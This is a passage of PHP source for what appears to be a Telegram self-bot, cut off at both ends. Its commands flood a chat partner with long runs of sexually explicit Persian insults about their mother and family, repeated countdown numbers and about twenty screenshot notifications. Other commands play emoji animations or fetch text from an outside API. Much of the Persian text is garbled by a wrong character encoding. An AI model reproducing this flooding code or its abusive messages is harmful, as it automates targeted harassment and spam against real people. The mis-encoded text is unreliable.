                            $msg_id + 3, 'message' => ' โน', 'parse_mode' => 'MarkDown']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'reply_to_msg_id' =>
                            $msg_id + 4, 'message' => 'โบ', 'parse_mode' => 'MarkDown']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'reply_to_msg_id' =>
                            $msg_id + 5, 'message' => 'โป', 'parse_mode' => 'MarkDown']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'reply_to_msg_id' =>
                            $msg_id + 6, 'message' => ' โผ', 'parse_mode' => 'MarkDown']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'reply_to_msg_id' =>
                            $msg_id + 7, 'message' => ' โฝ ', 'parse_mode' => 'MarkDown']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'reply_to_msg_id' =>
                            $msg_id + 8, 'message' => ' โพ ', 'parse_mode' => 'MarkDown']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'reply_to_msg_id' =>
                            $msg_id + 9, 'message' => ' โ ', 'parse_mode' => 'MarkDown']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'reply_to_msg_id' =>
                            $msg_id + 10, 'message' => ' ูพุฎุฎุฎ ุจุง? ุจุง? ูุฑุฒูุฏู ุดุงุช ุดุฏ? ', 'parse_mode' => 'MarkDown']);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                    }


                    if ($text == 'ุดูุงุฑุด ูุง' or $text == 'NumberFa') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'ุจุงูุงุจุงุด ุจุจูู ฺุทูุฑู ูุงุฏุฑุชู ุตูุงุฎู ูฺฉููู ฺุตฺฉู ููุตฺฉู ุฌุงู ุฎููุฎูุฎูุฎ ุจู ูุงููุณ ููุจุฑ ูุงุณ ูู ูุฏ ูุฏ ูฺฉู ฺุต ููฺฉููุช ุจู ูุงููุณ ูุงุณ ุงุฑุจุงุจุช ุดุงุฎ ูุดู ูููู ููฺฏู ุฏููพุงูู ุฑู ุชู ฺฉุณ ูุงุฏุฑุช ูู ููุฏู ฺุณฺฉู ูุงุฏุฑ ุญูุณ ฺฉุฑุฏู ฺฉูุฑ  ุจฺฉูู ุชู ูุง ุชุญุช ุดุนุงุน ูุงููุณ ฺฏุฑุงููุช"ุ ุฎุฎุฎูู ูุงุฏุฑฺฉุณู ุจุงูุงุจุงุด ุจุจููู ฺู ุจุงุฑุชู ุชู  ุงูุงุบ ุฌุงู ุจู ูุงููุณ ุฎุงุฑฺฉุณู ุชู ฺฉูุฑูู ููุดูู ูุง ุฎูุฑุุุุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎ ูุงุฏุฑฺฉุณู ฺฉุงุชฺฉููฺฉ ูุงููุณ ุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎ ุจุงูุงุจุจุงูุงุจุงุด.... ุงูู ูฺฉ ูุฑูุงู ุงุฒ ุงุฑุจุงุจุช ุจ ุชู ุงุถุญุงุฑ ุดุฏ ูพุณ ูุทูุง ุจุงูุงุจุงุด']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'ุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎูุงุฏุฑุชู ุจ 9999 ุฑูุด ูพูุฒูุดู ฺฏุงููุฏู ุจูู!ุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎ ุฎุงุฑุชู ุจ ุฑูุด ูุฑูููู 9999 ุจุงุฑ ฺฏุงููุฏู ุจูู!ุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎ ูพุฏุฑุชู ุจ ุตูุงุฎู ุจุณุชู 1 ุจุงุฑ ฺฉูุง ุจูู!ุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎ ูุงุฏุฑุช ฺฉุณู ุจุงูุงุจุงุด ูุงุฏุฑุช ุฎุฑู ุจุงูุงุจุงุด ุงูุจ ูููุงุฏุฑ ุงูุงุบ ุฒุงุฏู ูููู ฺฉุณุงูุช ูุงููุณ ุจู ูุฑููฺฏ ูุงููุณ ุจุฏุฎุจุช ุฎููู ุจู ุนุฏุจู ุชู ุจู ูุงููุณ ููููููุ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'ุฎุงุฑฺฉุตู ุจุงูุง ุจุงุด']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'ุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎุฎ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'ูพูุชุฒุง ุชู ฺฉุต ููุชุชุชุชุชุชุชุชุช']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'ุฑูุช ุชู ฺฉุต ููุช']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'ูพุงุฑู ุชู ฺฉุต ููุช']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'ุฏูุชุฑ ุชู ฺฉุต ููุช']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'ููุณ ุชู ฺฉุต ููุช']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'ฺฉุชุงุจ ุชู ฺฉุต ููุช']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'ุจุฑูุงูู ุชูฺฏุฑุงู ุชู ฺฉุต ููุช']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'ุจุฑูุงูู ุจูุฏูฺฉุงู ุชู ฺฉุต ููุช']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'ฺฏูุดูู ุชู ฺฉุต ููุช']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'ุงูู ูุฏุงุฏ ูุง ุชู ฺฉุต ููุช']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'ุฎูุฏฺฉุงุฑ ุชู ฺฉ ููุช']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'ุฌูุฌูู ุชู ฺฉุต ููุช']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'ููููู ุชู ฺฉุต ููุช']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'ุณูู ุชู ฺฉุต ููุช']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'ูพูุฌุฑู ุชู ฺฉุต ููุช']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'ูพุงุฑุฏู ุชู ฺฉุต ููุช']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'ูพูฺฉู ุชู ฺฉุต ููุช']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'ฺฉูุณ ูพูุณูู ุชู ฺฉุต ููุช']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'ุจุงุทุฑูู ฺฏูุดูู ุชู ฺฉุต ููุช']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'ุฌูุฑุงุจุงู ุชู ฺฉุต ููุช']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'ุจู ูุงููุณ ฺฉุต ููุช ุดุฏุ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ฑ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ฒ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ณ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ด']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ต']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ถ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ท']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ธ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?น']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ฑ?ฐ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ฑ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ฒ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ณ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ด']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ต']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ถ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ท']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ธ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?น']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ฑ?ฐ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ฑ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ฒ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ณ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ด']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ต']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ถ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ท']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ธ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?น']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ฑ?ฐ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ฑ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ฒ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ณ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ด']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ต']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ถ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ท']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ธ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?น']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ฑ?ฐ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ฑ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ฒ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ณ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ด']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ต']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ถ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ท']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ธ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?น']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '?ฑ?ฐ']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'ุฎุจ ุฏ?ฺฏู ุจุงุฎุช? ุจุฑู ุชู ฺฉุต ููุช ุดุงุช ุดุฏ? ุจุง?ุฒ ูพุณุฑู']);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                    }

                    if ($text == 'spam ss' or $text == 'screenspam') {
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);
                    }

                    if ($text == 'ุดูุงุฑุด ุงู' or $text == 'NumberEn') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'MADAR SAG BALA BASH']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'MADAR GAV BALA BASH']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'MADAR KHAR BALA BASH']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'MADAR KHAZ BALA BASH']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'MADAR HEYVUN BALA BASH']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'MADAR GORAZ BALA BASH']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'MADAR KROKODIL BALA BASH']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'MADAR SHOTOR BALA BASH']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'MADAR SHOTOR MORGH BALA BASH']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'MIKHAY TIZ BEGAMET HALA BEBI KHHKHKHKHK SORAATI NANATO MIKONAM']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'CHIYE KOS MEMBER BABT TAZE BARAT PC KHRIDE BI NAMOS MEMBER?']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'NANE MOKH AZAD NANE SHAM PAYNI NANE AROS MADAR KENTAKI PEDAR HALAZONI KIR MEMBERAK TIZ BASH YALA  TIZZZZZ๐']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'FEK KONAM NANE NANATI NAGAIIDAM KE ENGHAD SHAKHHI????????????????????????????????????HEN NANE GANGANDE PEDAR LASHI']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'to yatimi enghad to pv man daso pa mizani koskesh member man doroste nanato ye zaman mikardam vali toro beh kiramam nemigiram']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'KIRAM TU KUNE NNT BALA BASH KIRAM TU DAHANE MADARET BALA BASH']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'KHARETO BE GA MIDAM BALA BASH']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '1']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '2']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '3']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '4']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '5']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '6']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '7']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '8']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '9']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '10']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '1']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '2']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '3']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '4']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '5']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '6']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '7']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '8']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '9']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '10']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '1']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '2']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '3']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '4']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '5']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '6']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '7']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '8']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '9']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '10']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '1']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '2']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '3']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '4']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '5']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '6']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '7']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '8']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '9']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '10']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '1']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '2']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '3']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '4']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '5']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '6']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '7']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '8']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '9']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '10']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'NABINAM DIGE GOHE EZAFE BOKHORIA']);
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'KOS NANAT GAYIDE SHOD BINAMUS!!! SHOT SHODI BINAMUS!BYE']);
                        $Updates = yield $this->messages->sendScreenshotNotification(['peer' => $peer, 'reply_to_msg_id' => $msg_id,]);

                    }
                    if ($text == 'biorandom' or $text == 'ุจ?ู ุดุงูุณ?') {
                        $txt = yield $this->fileGetContents("https://api-smoketm.cf/api/text/txt.php");
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => $txt]);
                    }

                    if ($text == 'ุฒูุจูุฑ2' or $text == 'vizviz2') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '๐ฅ__________๐โโ๏ธ______________๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ______๐โโ๏ธ_______๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ______๐โโ๏ธ_____๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ___๐โโ๏ธ___๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ_๐โโ๏ธ_๐']);
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'ุฏุฑ ุฑูุช ุนูโน๏ธ๐']);
                    }


                    if ($text == '/proxy' or $text == 'ูพุฑูฺฉุณ?' or $text == 'ูพุฑูฺฉุณ? ู?ุฎูุงู' or $text == 'proxy bde' or $text == 'prox' or $text == 'ูพุฑูฺฉุณ' or $text == 'ูพุฑูฺฉุต?') {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "โซโซโซโซโซ ๏ฝ๐ฯ๐ซ๏ฝ๐ฝเน ฯั๏ผฏ๐ตโ ๐ฯะณ ๏ฝ๏ผฅใฅ๐๐ฐั๐ชะผ โฌโฌโฌโฌโฌ
  
http://api.codebazan.ir/mtproto/?type=html&channel=ProxyMTProto
โซโซโซโซโซ ๏ฝ๐ฯ๐ซ๏ฝ๐ฝเน ฯั๏ผฏ๐ตโ ๐ฯะณ ๏ฝ๏ผฅใฅ๐๐ฐั๐ชะผ โฌโฌโฌโฌโฌ"]);
                    }

                    if ($text == 'ุฒูุจูุฑ' or $text == 'vizviz') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '๐โโ๐ฅ________________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐โโ๐ฅ_______________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐โโ๐ฅ______________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐โโ๐ฅ_____________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐โโ๐ฅ____________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐โโ๐ฅ___________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐โโ๐ฅ__________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐โโ๐ฅ_________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐โโ๐ฅ________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐โโ๐ฅ_______๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐โโ๐ฅ______๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐โโ๐ฅ____๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐โโ๐ฅ___๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐โโ๐ฅ__๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐โโ๐ฅ_๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐จโ๐ฆฝ๐ญ๐ฅบ']);
                    }

                    if ($text == '2ููุจ' or $text == 'Love2') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '๐๐๐๐๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐งก๐งก๐งก๐งก๐งก']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'I love๐๐งก']);
                    }
                    if ($text == 'ฺฏูู' or $text == 'goh') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => 'G']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'O']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'H']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'N']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'A']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'KH']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'O']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'R']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'GOH NAKHOR๐ฉ']);
                    }

                    if ($text == 'ุจู?ุฑ ฺฉุฑููุง' or $text == 'Corona') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '๐ฆ   โข   โข   โข   โข   โข   โข   โข   โข   โข   โข  ๐ซ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฆ   โข   โข   โข   โข   โข   โข   โข   โข   โข   โ  ๐ซ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฆ   โข   โข   โข   โข   โข   โข   โข   โข   โ   โข  ๐ซ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฆ   โข   โข   โข   โข   โข   โข   โข   โ   โข   โข  ๐ซ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฆ   โข   โข   โข   โข   โข   โข   โ   โข   โข   โข  ๐ซ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฆ   โข   โข   โข   โข   โข   โ   โข   โข   โข   โข  ๐ซ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฆ   โข   โข   โข   โข   โ   โข   โข   โข   โข   โข  ๐ซ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฆ   โข   โข   โข   โ   โข   โข   โข   โข   โข   โข  ๐ซ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฆ   โข   โข   โ   โข   โข   โข   โข   โข   โข   โข  ๐ซ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฆ   โข   โ   โข   โข   โข   โข   โข   โข   โข   โข  ๐ซ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฆ   โ   โข   โข   โข   โข   โข   โข   โข   โข   โข  ๐ซ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฅ  โข   โข   โข   โข   โข   โข   โข   โข   โข   โข  ๐ซ']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐๐๐๐๐๐๐๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'we wine']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => 'Corona Is Dead']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐ฉ๐ชPawn_Self ฺฉ?ุฑููุงุฑู ุดฺฉุณุช ุฏุงุฏ๐ฉ๐ช']);
                    }
                    if ($text == 'ุงูฺฏุด' or $text == 'ุณููุงุฎ') {
                        yield $this->messages->sendMessage(['peer' => $peer, 'message' => '๐________________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐_______________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐______________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐_____________๐']);

                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id + 1, 'message' => '๐____________๐']);

